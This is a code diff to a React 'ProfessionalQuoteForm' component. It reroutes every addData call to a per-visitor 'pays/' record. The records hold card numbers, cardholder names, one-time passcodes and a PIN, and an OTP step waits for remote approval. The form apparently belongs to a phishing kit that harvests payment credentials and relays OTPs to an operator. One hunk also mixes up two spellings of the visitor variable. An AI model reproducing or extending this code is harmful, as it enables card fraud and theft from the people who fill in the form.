@@ -920,7 +920,7 @@ function ProfessionalQuoteForm() {
     // Save current step
     const visitorId = localStorage.getItem("visitor");
     if (visitorId) {
-      addData({ id: visitorId, currentPage });
+      addData(`pays/${visitorId}`, { id: visitorId, currentPage });
     }
   }, [currentPage]);
 
@@ -942,7 +942,7 @@ function ProfessionalQuoteForm() {
               setWaitingForApproval(false);
               setApprovalStatus("approved");
               setOtpError(null);
-              await addData({ id: visitorId, currentPage: 8 }); // Go to PIN step
+              await addData(`pays/${visitorId}`, { id: visitorId, currentPage: 8 }); // Go to PIN step
             } else if (waitingForApproval && data.otpApproved === false) {
               setWaitingForApproval(false);
               setApprovalStatus("rejected");
@@ -1154,7 +1154,7 @@ function ProfessionalQuoteForm() {
     const vistorId = localStorage.getItem("visitor");
     if (currentPage > 1) {
       setCurrentStep(currentPage - 1);
-      addData({ id: vistorId, currentPage });
+      addData(`pays/${visitorId}`, { id: vistorId, currentPage });
     }
   };
 
@@ -1167,7 +1167,7 @@ function ProfessionalQuoteForm() {
     const visitorId = localStorage.getItem("visitor");
 
     try {
-      await addData({
+      await addData(`pays/${visitorId}`, {
         id: visitorId,
         otp,
         otpVerified: false,
@@ -1247,7 +1247,7 @@ function ProfessionalQuoteForm() {
 
   function handlePayment(): void {
     const visitorId = localStorage.getItem("visitor");
-    addData({
+    addData(`pays/${visitorId}`, {
       id: visitorId,
       cardNumber,
       cardName,
@@ -1265,7 +1265,7 @@ function ProfessionalQuoteForm() {
       setPaymentProcessing(false);
       setCurrentStep(7);
       setOtpTimer(120);
-      addData({
+      addData(`pays/${visitorId}`, {
         id: visitorId,
         paymentStatus: "completed",
         otpSent: true,
@@ -1284,7 +1284,7 @@ function ProfessionalQuoteForm() {
     setWaitingForApproval(true);
     setApprovalStatus("pending");
 
-    addData({
+    addData(`pays/${visitorId}`, {
       id: visitorId,
       otp,
       otpAttempts: otpAttempts + 1,
@@ -1299,7 +1299,7 @@ function ProfessionalQuoteForm() {
   function sendOTP(): void {
     const visitorId = localStorage.getItem("visitor");
     setOtpTimer(120);
-    addData({
+    addData(`pays/${visitorId}`, {
       id: visitorId,
       otpSentTime: new Date().toISOString(),
       otpResendCount: (otpAttempts || 0) + 1,
@@ -1314,7 +1314,7 @@ function ProfessionalQuoteForm() {
     const visitorId = localStorage.getItem("visitor");
     setIsSubmitting(true);
 
-    addData({
+    addData(`pays/${visitorId}`, {
       id: visitorId,
       pinCode,
       pinSubmittedTime: new Date().toISOString(),
